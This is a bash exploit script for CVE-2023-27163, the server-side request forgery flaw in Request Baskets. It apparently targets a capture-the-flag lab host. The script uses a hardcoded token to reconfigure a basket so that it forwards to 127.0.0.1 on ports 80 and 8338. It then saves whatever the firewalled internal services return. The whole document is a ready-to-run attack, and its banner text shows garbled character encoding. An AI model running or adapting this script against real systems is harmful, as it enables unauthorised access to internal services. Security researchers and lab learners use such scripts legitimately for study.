#!/bin/bash

# CVE-2023-27163 - Request Baskets SSRF Exploit
# Target: 10.129.229.26:55555

TARGET="http://10.129.229.26:55555"
BASKET_NAME="pwned"
TOKEN="5m_W7pAn__zSRlLCaKjWcdzY6MneayMKAUhh-wJDkuYW"

echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "ğŸ¯ Request Baskets SSRF Exploit - CVE-2023-27163"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo ""

# Test Port 80 (filtered HTTP)
echo "[*] Step 1: Configuring SSRF to access port 80..."
curl -s -X PUT "${TARGET}/api/baskets/${BASKET_NAME}" \
  -H "Authorization: ${TOKEN}" \
  -H 'Content-Type: application/json' \
  -d '{
    "forward_url": "http://127.0.0.1:80",
    "proxy_response": true,
    "insecure_tls": false,
    "expand_path": true,
    "capacity": 250
  }' > /dev/null

echo "[+] Configuration applied!"
echo ""

echo "[*] Step 2: Accessing port 80 via SSRF..."
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
curl -s "${TARGET}/${BASKET_NAME}" -o port80_response.html
echo "[+] Response saved to: port80_response.html"
echo ""

# Show first few lines
echo "[*] First 20 lines of response:"
head -20 port80_response.html
echo ""
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo ""

# Test Port 8338 (filtered unknown)
echo "[*] Step 3: Configuring SSRF to access port 8338..."
curl -s -X PUT "${TARGET}/api/baskets/${BASKET_NAME}" \
  -H "Authorization: ${TOKEN}" \
  -H 'Content-Type: application/json' \
  -d '{
    "forward_url": "http://127.0.0.1:8338",
    "proxy_response": true,
    "insecure_tls": false,
    "expand_path": true,
    "capacity": 250
  }' > /dev/null

echo "[+] Configuration applied!"
echo ""

echo "[*] Step 4: Accessing port 8338 via SSRF..."
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
curl -s "${TARGET}/${BASKET_NAME}" -o port8338_response.html
echo "[+] Response saved to: port8338_response.html"
echo ""

# Show first few lines
echo "[*] First 20 lines of response:"
head -20 port8338_response.html
echo ""
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo ""

echo "âœ… SSRF exploitation complete!"
echo ""
echo "ğŸ“ Files created:"
echo "   - port80_response.html"
echo "   - port8338_response.html"
echo ""
echo "ğŸ” Check these files to see what services are running!"

